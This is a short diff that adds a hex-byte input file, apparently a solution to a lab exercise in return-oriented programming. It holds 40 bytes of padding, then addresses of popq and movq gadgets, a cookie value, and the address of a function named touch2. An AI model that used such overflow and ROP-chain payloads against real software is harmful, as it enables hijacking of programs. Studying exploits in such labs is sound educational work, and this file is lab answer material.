@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00  /* address with command popq %rax */
+fa 97 b9 59 00 00 00 00  /* cookie */
+a2 19 40 00 00 00 00 00  /* address with command movq %rax, %rdi */
+ec 17 40 00 00 00 00 00  /* address of touch2 */
